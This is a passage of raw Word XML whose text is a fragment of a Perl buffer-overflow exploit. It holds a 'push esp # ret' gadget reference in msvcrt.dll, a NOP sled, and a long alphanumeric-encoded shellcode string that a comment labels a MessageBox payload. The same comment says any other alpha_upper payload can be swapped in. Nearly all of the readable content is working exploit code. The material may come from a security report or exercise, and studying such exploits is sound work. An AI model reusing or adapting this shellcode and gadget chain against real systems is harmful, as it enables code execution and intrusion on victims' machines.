            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> to 'push </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>esp</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> # ret ' [msvcrt.dll]</w:t>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:tab/>
            </w:r>
          </w:p>
          <w:p w14:paraId="1AD99761" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="289132B1" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>$buffer .= "\x90" x 15;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="65526A98" w14:textId="4586F371" w:rsidR="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="6536033A" w14:textId="4B3D2F42" w:rsidR="007E747F" w:rsidRPr="00734785" w:rsidRDefault="007E747F" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>#MessageBox payload (replace with any other alpha_upper payload and it should still function)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="25D02F33" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>$buffer .= "\x89\xe7\</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>xdb</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>\xd0\xd9\x77\xf4\x5d\x55\x59\x49\x49\x49\x49" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3EAF732C" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6BE228F0" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E4963BD" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="408440DF" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x49\x49\x5a" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2CB9847A" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x4b\x4d\x4b\x49\x49\x52\x54\x56\x44\x5a\x54\x56\x51\x4e" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="641C1183" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x32\x4f\x42\x52\x57\x56\x51\x49\x59\x45\x34\x4c\x4b\x54" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="23D8BC96" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>"\x31\x56\x50\x4c\x4b\x52\x56\x54\x4c\x4c\x4b\x43\x46\x45" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4CC792D8" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x4c\x4c\x4b\x47\x36\x54\x48\x4c\x4b\x43\x4e\x47\x50\x4c" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F5945D5" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x4b\x47\x46\x56\x58\x50\x4f\x45\x48\x43\x45\x4c\x33\x56" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3ED8BC4B" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x39\x45\x51\x58\x51\x4b\x4f\x4b\x51\x43\x50\x4c\x4b\x52" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1BBC60C4" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x4c\x51\x34\x51\x34\x4c\x4b\x51\x55\x47\x4c\x4c\x4b\x56" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24D8F8AD" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x34\x56\x48\x52\x58\x45\x51\x5a\x4a\x4c\x4b\x50\x4a\x54" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="32C8C48A" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x58\x4c\x4b\x51\x4a\x47\x50\x45\x51\x5a\x4b\x4b\x53\x47" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5B28A4BE" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x44\x50\x49\x4c\x4b\x50\x34\x4c\x4b\x43\x31\x5a\x4e\x50" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4144F938" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x31\x4b\x4f\x50\x31\x49\x50\x4b\x4c\x4e\x4c\x4d\x54\x49" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E19BE47" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x50\x54\x34\x43\x37\x4f\x31\x58\x4f\x54\x4d\x43\x31\x58" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0CA5509C" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x47\x5a\x4b\x5a\x54\x47\x4b\x43\x4c\x51\x34\x47\x58\x52" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D122798" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x55\x4d\x31\x4c\x4b\x51\x4a\x51\x34\x43\x31\x5a\x4b\x52" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C85D186" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x46\x4c\x4b\x54\x4c\x50\x4b\x4c\x4b\x50\x5a\x45\x4c\x43" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="34C403AE" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x31\x5a\x4b\x4c\x4b\x43\x34\x4c\x4b\x43\x31\x4b\x58\x4d" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5ECE09BE" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x59\x50\x44\x56\x44\x45\x4c\x43\x51\x58\x43\x58\x32\x43" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2158AE91" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x38\x47\x59\x4e\x34\x4c\x49\x4b\x55\x4b\x39\x4f\x32\x52" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="622DC3C5" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x48\x4c\x4e\x50\x4e\x54\x4e\x5a\x4c\x50\x52\x4d\x38\x4d" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10BC4744" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x4f\x4b\x4f\x4b\x4f\x4b\x4f\x4b\x39\x47\x35\x54\x44\x4f" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2206C85B" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x4b\x43\x4e\x49\x48\x4b\x52\x52\x53\x4d\x57\x45\x4c\x51" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79411DED" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x34\x56\x32\x4b\x58\x4c\x4e\x4b\x4f\x4b\x4f\x4b\x4f\x4b" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="52260941" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x39\x51\x55\x54\x48\x52\x48\x52\x4c\x52\x4c\x51\x30\x47" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="183DDBB5" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x31\x45\x38\x56\x53\x47\x42\x56\x4e\x45\x34\x45\x38\x54" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1822611C" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x35\x43\x43\x43\x55\x43\x42\x4c\x48\x51\x4c\x56\x44\x54" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79F4250B" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x4a\x4c\x49\x4d\x36\x51\x46\x4b\x4f\x56\x35\x43\x34\x4b" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="263E07D7" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x39\x49\x52\x56\x30\x4f\x4b\x49\x38\x4e\x42\x50\x4d\x4f" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="34BF8BDD" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x4c\x4c\x47\x45\x4c\x56\x44\x50\x52\x5a\x48\x45\x31\x4b" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="33655F13" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x4f\x4b\x4f\x4b\x4f\x52\x48\x52\x4f\x54\x38\x51\x48\x47" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="52FD21CF" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x50\x43\x58\x43\x51\x52\x47\x52\x45\x50\x42\x43\x58\x50" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5406EE18" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x4d\x45\x35\x54\x33\x54\x33\x56\x51\x49\x4b\x4d\x58\x51" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28E8FE24" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x4c\x51\x34\x54\x4a\x4c\x49\x4d\x33\x52\x48\x56\x4e\x50" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D6A6261" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x58\x51\x30\x51\x30\x45\x38\x52\x4c\x52\x4f\x43\x51\x52" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="454CD8AA" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00734785">
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>"\x44\x52\x48\x47\x50\x52\x50\x45\x31\x52\x59\x43\x58\x45" .</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3020B8CB" w14:textId="77777777" w:rsidR="00734785" w:rsidRPr="00734785" w:rsidRDefault="00734785" w:rsidP="00734785">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
                <w:lang w:eastAsia="en-US"/>
